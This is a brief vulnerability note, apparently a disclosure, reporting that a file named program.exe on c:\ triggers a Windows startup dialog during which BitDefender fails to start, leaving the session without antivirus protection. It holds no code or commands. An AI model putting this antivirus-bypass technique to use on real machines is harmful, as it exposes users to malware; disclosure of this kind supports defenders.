RACE CONDITION
--------------
At Windows startup, when a file named: program.exe is found on c:\ 
Windows send an alert message, messagebox controls are:
2 buttons -> "Rename" or "Ignore"
1 checkbox -> [X] Do not do this verification on startup. 
(Sorry, haven't got the exact english message)

At this moment, BitDefender can't start, so we have a session without virus protection.
